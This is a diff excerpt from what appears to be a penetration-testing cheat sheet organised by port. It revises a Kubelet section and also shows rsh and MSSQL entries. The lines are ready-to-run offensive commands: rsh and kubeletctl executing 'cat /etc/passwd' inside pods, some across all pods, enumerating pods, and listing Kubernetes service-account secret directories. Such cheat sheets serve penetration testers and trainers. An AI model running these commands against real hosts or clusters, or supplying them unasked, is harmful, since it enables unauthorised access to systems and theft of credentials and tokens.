@@ -696,10 +696,14 @@ rlogin -l $USERNAME $TARGET
 +---------- Execute Commands ----------+
 rsh -l $USERNAME $TARGET cat /etc/passwd
 
-[*] (10249, 10250, 10256) Kubelet
-+---------- Kubelet API ----------+
+[*] (10249-10250) Kubelet
+kubeletctl -s $TARGET pods
 kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
-kubeletctl -s $TARGET run "ls /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccout" --all-pods
+kubeletctl -s $TARGET run "cat /etc/passwd" -p $pod -n $namespace -c $container
+pod=nginx; namespace=default; container=nginx
+kubeletctl -s $TARGET run "ls -la /run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
+kubeletctl -s $TARGET run "ls -la /var/run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
+kubeletctl -s $TARGET run "ls -la /secrets/kubernetes.io/serviceaccout" -p $pod -n $namespace -c $container
 
 [*] (1433) MSSQL
 +---------- Spray Service ----------+
